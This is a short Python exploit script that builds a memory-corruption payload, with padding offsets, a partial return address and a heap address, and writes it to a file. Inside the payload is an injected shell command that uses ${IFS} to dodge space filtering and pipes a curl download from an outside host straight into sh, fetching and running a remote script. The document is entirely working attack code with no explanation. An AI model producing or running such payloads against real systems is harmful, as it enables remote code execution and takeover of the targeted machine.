#!/usr/bin/python3


import struct
OFFSET_DBCHECKSUM=392
OFFSET_DBCHECKSUM_VAL=616
OFFSET_JUNK=80 # As seen in heap memory dump


p32 = lambda x: struct.pack('<I', x)


def gen_payload(addr=0x1e000):
    # padding being overwritten
    l = b'a' * OFFSET_JUNK

    payload = b'b'*0x40 + b';curl${IFS}-k${IFS}https://bla.com/s/sploit|sh;'

    # generate first part
    ret_addr = b'\x78\xec'
    part1 = b'b' * (OFFSET_DBCHECKSUM - len(payload)) + payload + ret_addr

    # generate second part
    heap_addr = addr + 0x86ac
    part2 = b'b'*(OFFSET_DBCHECKSUM_VAL - len(payload)) + payload + p32(heap_addr)

    out = part1 + b' ' + part2
    assert len(out) == 1015
    return out


if __name__ == '__main__':
    with open('c', 'wb') as f:
        f.write(gen_payload())
